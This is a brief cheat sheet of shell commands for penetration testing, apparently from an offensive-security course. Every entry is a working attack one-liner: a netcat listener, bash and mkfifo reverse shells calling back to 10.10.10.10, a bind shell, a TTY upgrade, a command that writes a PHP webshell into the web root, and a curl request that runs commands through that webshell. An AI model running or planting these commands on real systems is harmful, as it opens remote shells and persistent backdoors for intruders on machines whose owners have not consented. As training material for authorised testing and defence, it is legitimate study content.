|   |   |
|---|---|
|**Using Shells**||
|`nc -lvnp 1234`|Start a `nc` listener on a local port|
|`bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`|Send a reverse shell from the remote server|
|`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f`|Another command to send a reverse shell from the remote server|
|`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f`|Start a bind shell on the remote server|
|`nc 10.10.10.1 1234`|Connect to a bind shell started on the remote server|
|`python -c 'import pty; pty.spawn("/bin/bash")'`|Upgrade shell TTY (1)|
|`ctrl+z` then `stty raw -echo` then `fg` then `enter` twice|Upgrade shell TTY (2)|
|`echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`|Create a webshell php file|
|`curl http://SERVER_IP:PORT/shell.php?cmd=id`|Execute a command on an uploaded webshell|
